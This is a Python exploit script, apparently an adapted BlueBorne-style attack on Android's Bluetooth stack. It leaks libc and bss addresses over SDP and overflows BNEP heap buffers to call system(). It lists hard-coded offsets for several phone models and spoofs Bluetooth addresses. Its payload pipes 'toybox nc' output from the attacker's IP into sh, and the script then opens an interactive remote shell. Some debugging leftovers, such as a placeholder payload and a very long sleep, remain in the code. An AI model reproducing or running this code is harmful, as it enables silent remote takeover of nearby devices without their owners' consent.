import os
import sys
import time
import struct
import select
import binascii

import bluetooth
from bluetooth import _bluetooth as bt

import bluedroid
import connectback

from pwn import log

# Listening TCP ports that need to be opened on the attacker machine
NC_PORT = 1233
STDOUT_PORT = 1234
STDIN_PORT = 1235


# Exploit offsets work for these (exact) libs:

# bullhead:/ # sha1sum /system/lib/hw/bluetooth.default.so
# 8a89cadfe96c0f79cdceee26c29aaf23e3d07a26  /system/lib/hw/bluetooth.default.so
# bullhead:/ # sha1sum /system/lib/libc.so
# 0b5396cd15a60b4076dacced9df773f75482f537  /system/lib/libc.so


# For our device
#LIBC_TEXT_STSTEM_OFFSET = 0x0006d360 + 1
#LIBC_SOME_BLX_OFFSET = 0x6fe9b22a - 0x6fe7d000

# Asus MemoPad 7: ME572C/K007 with Android 5.0.1 (rooted version)
LIBC_TEXT_STSTEM_OFFSET = 0x000827d0 + 1
LIBC_SOME_BLX_OFFSET =  0xf761d47e - 0xf75ec000
#0xe2bd3562
#0xe2bd7f53
BSS_ACL_REMOTE_NAME_OFFSET = 0xe2bd7f53 - 0xe28ae000
BLUETOOTH_BSS_SOME_VAR_OFFSET = 0xe2d107a4 - 0xe2aae000

# Aligned to 4 inside the name on the bss (same for both supported phones)
#BSS_ACL_REMOTE_NAME_OFFSET = 0x202ee4
#BLUETOOTH_BSS_SOME_VAR_OFFSET = 0x37aa0d90 - 0x37852000


#GT-i9001
#LIBC_TEXT_STSTEM_OFFSET = 0x0001cf98 + 1
#LIBC_SOME_BLX_OFFSET = 0x40268028 - 0x4027e000
#BSS_ACL_REMOTE_NAME_OFFSET = 0x202ee4
#BLUETOOTH_BSS_SOME_VAR_OFFSET = 0x51c12dc8 - 0x51b5b000
# bluetooth: 51b5b000
# libc: 4027e000

# For Pixel 7.1.2 patch level Aug/July 2017
#LIBC_TEXT_STSTEM_OFFSET = 0x45f80 + 1 - 56 # system + 1
#LIBC_SOME_BLX_OFFSET = 0x1a420 + 1 - 608 # eventfd_write + 28 + 1

# For Nexus 5X 7.1.2 patch level Aug/July 2017
#LIBC_TEXT_STSTEM_OFFSET = 0x45f80 + 1
#LIBC_SOME_BLX_OFFSET = 0x1a420 + 1

# Aligned to 4 inside the name on the bss (same for both supported phones)
#BSS_ACL_REMOTE_NAME_OFFSET = 0x202ee4
#BLUETOOTH_BSS_SOME_VAR_OFFSET = 0x14b244

MAX_BT_NAME = 0xf5

# Payload details (attacker IP should be accessible over the internet for the victim phone)
SHELL_SCRIPT = b'toybox nc {ip} {port} | sh'
#SHELL_SCRIPT = b'ping 192.168.178.26'


PWNING_TIMEOUT = 10
BNEP_PSM = 15
PWN_ATTEMPTS = 1
LEAK_ATTEMPTS = 1


def set_bt_name(payload, src_hci, src, dst):
    # Create raw HCI sock to set our BT name
    raw_sock = bt.hci_open_dev(bt.hci_devid(src_hci))
    flt = bt.hci_filter_new()
    bt.hci_filter_all_ptypes(flt)
    bt.hci_filter_all_events(flt)
    raw_sock.setsockopt(bt.SOL_HCI, bt.HCI_FILTER, flt)

    # Send raw HCI command to our controller to change the BT name (first 3 bytes are padding for alignment)
    raw_sock.sendall(binascii.unhexlify('01130cf8cccccc') + payload.ljust(MAX_BT_NAME, b'\x00'))
    raw_sock.close()
    #time.sleep(1)
    time.sleep(0.1)

    # Connect to BNEP to "refresh" the name (does auth)
    bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bnep.bind((src, 0))
    print("Connecting to: {}".format(src))
    bnep.connect((dst, BNEP_PSM))
    bnep.close()

    # Close ACL connection
    os.system('hcitool dc %s' % (dst,))
    #time.sleep(1)


def set_rand_bdaddr(src_hci):
    addr = ['%02x' % (ord(c),) for c in os.urandom(6)]
    # NOTW: works only with CSR bluetooth adapters!
    cmd = 'sudo bccmd -d %s psset -r bdaddr 0x%s 0x00 0x%s 0x%s 0x%s 0x00 0x%s 0x%s' % (src_hci, addr[3], addr[5], addr[4], addr[2], addr[1], addr[0])
    os.system('sudo bccmd -d %s psset -r bdaddr 0x%s 0x00 0x%s 0x%s 0x%s 0x00 0x%s 0x%s' %
              (src_hci, addr[3], addr[5], addr[4], addr[2], addr[1], addr[0]))
    final_addr = ':'.join(addr)
    log.info('Set %s to new rand BDADDR %s using %s' % (src_hci, final_addr, cmd))
    time.sleep(1)
    os.system("sudo hciconfig %s up" % src_hci)
    time.sleep(1)
    while bt.hci_devid(final_addr) < 0:
        time.sleep(0.1)
    log.info('New MAC set successfully')
    return final_addr


def memory_leak_get_bases(src, src_hci, dst):
    prog = log.progress('Doing stack memory leak...')

    # Get leaked stack data. This memory leak gets "deterministic" "garbage" from the stack.
    result = bluedroid.do_sdp_info_leak(dst, src)

    for row in result:
        print("\t".join("{0:#0{1}x}".format(x,10) for x in list(row)))

    # Calculate according to known libc.so and bluetooth.default.so binaries
    #likely_some_libc_blx_offset = result[4][3]
    #likely_some_bluetooth_default_global_var_offset = result[-5][-1]

    # Android 5.0.1 on MemoPad 7 (root)
    likely_some_libc_blx_offset = result[3][3]
    likely_some_bluetooth_default_global_var_offset = result[3][5]

    # GT 9001
    #likely_some_libc_blx_offset = result[1][0]
    #likely_some_bluetooth_default_global_var_offset = result[6][5]


    print("{0:#0{1}x}".format(likely_some_bluetooth_default_global_var_offset,10))
    print("{0:#0{1}x}".format(likely_some_libc_blx_offset,10))
    libc_text_base = likely_some_libc_blx_offset - LIBC_SOME_BLX_OFFSET
    bluetooth_default_bss_base = likely_some_bluetooth_default_global_var_offset - BLUETOOTH_BSS_SOME_VAR_OFFSET

    log.info('libc_base: 0x%08x, bss_base: 0x%08x' % (libc_text_base, bluetooth_default_bss_base))

    # Close SDP ACL connection
    os.system('hcitool dc %s' % (dst,))
    time.sleep(0.1)

    prog.success()
    return libc_text_base, bluetooth_default_bss_base


def pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, my_ip, libc_text_base):
    # Gen new BDADDR, so that the new BT name will be cached
    src = set_rand_bdaddr(src_hci)

    # Payload is: '"\x17AAAAAAsysm";\n<bash_commands>\n#'
    # 'sysm' is the address of system() from libc. The *whole* payload is a shell script.
    # 0x1700 == (0x1722 & 0xff00) is the "event" of a "HORRIBLE_HACK" message.
    payload = struct.pack('<III', 0xAAAA1722, 0x41414141, system_addr) + b'";\n' + \
                          SHELL_SCRIPT.format(ip=my_ip, port=NC_PORT) + b'\n#'
    #payload = struct.pack('<III', system_addr, 0x41414141, system_addr) + b'";\n' + \
    #                      SHELL_SCRIPT.format(ip=my_ip, port=NC_PORT) + b'\n#'
    x = acl_name_addr+4

    shell_addr = x+24 # SHELL SCRIPT address
    ptr0 = x+16  -4 # points to ptr0+4 (ptr1)
    ptr1 = x+8   -8 # points to ptr1+8 (ptr2)
    ptr2 = x+20 -28 # points to ptr2+28 (system_addr)
    #payload = struct.pack('<IIIIII', shell_addr, ptr1, ptr2, ptr0, ptr1, system_addr) + SHELL_SCRIPT.format(ip=my_ip, port=NC_PORT)
    payload = binascii.unhexlify('6165696f75') # aeiou -> Used to find acl name offset

    log.info("shelladdr 0x%08x" % shell_addr)
    log.info("ptr0      0x%08x" % ptr0)
    log.info("ptr1      0x%08x" % ptr1)
    log.info("ptr2      0x%08x" % ptr2)
    log.info("system    0x%08x" % system_addr)

    assert len(payload) < MAX_BT_NAME
    #assert b'\x00' not in payload

    # Puts payload into a known bss location (once we create a BNEP connection).
    set_bt_name(payload, src_hci, src, dst)
    time.sleep(100000)

    prog = log.progress('Connecting to BNEP again')

    bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bnep.bind((src, 0))
    bnep.connect((dst, BNEP_PSM))

    print("Reconnected to BNEP")

    prog.success()
    prog = log.progress('Pwning...')

    # Each of these messages causes BNEP code to send 100 "command not understood" responses.
    # This causes list_node_t allocations on the heap (one per reponse) as items in the xmit_hold_q.
    # These items are popped asynchronously to the arrival of our incoming messages (into hci_msg_q).
    # Thus "holes" are created on the heap, allowing us to overflow a yet unhandled list_node of hci_msg_q.
    MULTIPLICATOR = 100
    NO_XMIT_CREATING_PKTS = 100
    for i in range(NO_XMIT_CREATING_PKTS):
        bnep.send(binascii.unhexlify('8109' + '800109' * MULTIPLICATOR))

    # Repeatedly trigger the vuln (overflow of 8 bytes) after an 8 byte size heap buffer.
    # This is highly likely to fully overflow over instances of "list_node_t" which is exactly
    # 8 bytes long (and is *constantly* used/allocated/freed on the heap).
    # Eventually one overflow causes a call to happen to "btu_hci_msg_process" with "p_msg"
    # under our control. ("btu_hci_msg_process" is called *constantly* with messages out of a list)
    pkt = (binascii.unhexlify('8101000303030303030303030303030303030303030303030303030303030303030303'))
    for i in range(1000):
        # If we're blocking here, the daemon has crashed
        _, writeable, _ = select.select([], [bnep], [], PWNING_TIMEOUT)
        if not writeable:
            break
        #bnep.send(binascii.unhexlify('810100') +
        #          struct.pack('<II', 0, acl_name_addr))
        # We MUST have that many '0x41'
        # Leads to SEGV at 0x42414141: 41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414142
        # 16 bytes of 0x41414141
        #bnep.send(binascii.unhexlify('810100') + binascii.unhexlify('41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414142'))
        #jmp_target = acl_name_addr
        pwn_packet = (binascii.unhexlify('810100') +
                        struct.pack('<I', 0x41414141) +
                        struct.pack('<I', 0x41414142) +
                        struct.pack('<I', 0x41414143) +
                        struct.pack('<I', 0x41424344) +
                        struct.pack('<I', 0x41414145) +
                        struct.pack('<I', 0x41414146) +
                        struct.pack('<I', 0x41414147) +
                        struct.pack('<I', 0x41414148) +
                        struct.pack('<I', 0x41414149) +
                        struct.pack('<I', 0x4141414a) +
                        struct.pack('<I', 0x4141414b) +
                        struct.pack('<I', 0x4141414c) +
                        struct.pack('<I', 0x4141414d) +
                        struct.pack('<I', 0x4141414e) +
                        struct.pack('<I', 0x4141414f) +
                        struct.pack('<I', 0x41414140)
                        )
        #bnep.send(pwn_packet) # segfaults at jmp_target
        bnep.send(pkt)
    else:
        log.info("Looks like it didn't crash. Possibly worked")

    prog.success()

def main(src_hci, dst, my_ip):
    os.system('hciconfig %s sspmode 0' % (src_hci,))
    os.system('hcitool dc %s' % (dst,))

    sh_s, stdin, stdout = connectback.create_sockets(NC_PORT, STDIN_PORT, STDOUT_PORT)

    for i in range(PWN_ATTEMPTS):
        log.info('Pwn attempt %d:' % (i,))

        # Create a new BDADDR
        src = set_rand_bdaddr(src_hci)

        # Try to leak section bases
        for j in range(LEAK_ATTEMPTS):
            libc_text_base, bluetooth_default_bss_base = memory_leak_get_bases(src, src_hci, dst)
            if (libc_text_base & 0xfff == 0) and (bluetooth_default_bss_base & 0xfff == 0):
                break
        else:
            #assert False, "Memory doesn't seem to have leaked as expected. Wrong .so versions?"
            pass
        system_addr = LIBC_TEXT_STSTEM_OFFSET + libc_text_base
        acl_name_addr = BSS_ACL_REMOTE_NAME_OFFSET + bluetooth_default_bss_base
        #assert acl_name_addr % 4 == 0
        log.info('system: 0x%08x, acl_name: 0x%08x' % (system_addr, acl_name_addr))

        pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, my_ip, libc_text_base)
        # Check if we got a connectback
        readable, _, _ = select.select([sh_s], [], [], PWNING_TIMEOUT)
        if readable:
            log.info('Done')
            break

    else:
        assert False, "Pwning failed all attempts"

    connectback.interactive_shell(sh_s, stdin, stdout, my_ip, STDIN_PORT, STDOUT_PORT)


if __name__ == '__main__':
    main(*sys.argv[1:])
